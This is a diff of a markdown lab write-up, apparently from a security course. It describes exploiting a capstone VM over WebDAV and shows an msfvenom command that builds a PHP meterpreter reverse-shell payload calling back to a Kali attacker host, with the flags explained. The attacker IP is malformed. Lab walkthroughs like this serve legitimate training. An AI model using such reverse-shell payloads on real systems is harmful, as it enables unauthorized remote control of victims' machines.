@@ -170,11 +170,14 @@ c) **Exploitation**
 ![](images-red/webdav-opened.png)
 
 
-- Now that I have acess to file sharing at Capsone VM through my Kali VM, I can hack Capstone by running a malacious script (if you may).  
+- Now that I have acess to file sharing at Capsone VM through my Kali VM, you can hack Capstone by running a malacious script (if you may).  
 
-- To do this, on my Kali Vm I can use `msfvenom` to create a reverse shell payload script in Kali Linux (hacker's VM). This payload when run on the victim machine (capstone VM) can extablish a retrograde connection with Kali linux on the Hacker's machine (Kali VM) and open up session and a terminal to execute additional code. This is where the Exploitation phase ends and the post-exploitation starts. 
+- To do this, on my Kali VM I can use `msfvenom` to create a reverse shell payload script in Kali Linux (hacker's VM). This payload when run on the victim machine (capstone VM) can extablish a retrograde connection with Kali linux on the Hacker's machine (Kali VM) and open up session and a terminal to execute additional code. This is where the Exploitation phase ends and the post-exploitation starts. 
 
-- `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1.8 LPORT=666 -f raw > shell.php`
+- `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.1.8 lport=666 -f raw > shell.php`
+- `-p` specifies payload, `-f` specifies the file type
+- `php/meterpreter/reverse_tcp` This will format the payload in php and code it such that its transferred to the victim in stages and not all at once (wich is more likely to fail becuse of large size)- In this particular setting however its not very relevent, because I am going to directly paste it. 
+- `lhost` and `lport` specify the hacker's ip address and port which this payload will instruct the victim's mchine to. 
 
 ![](images-red/msfvenom.png)
 
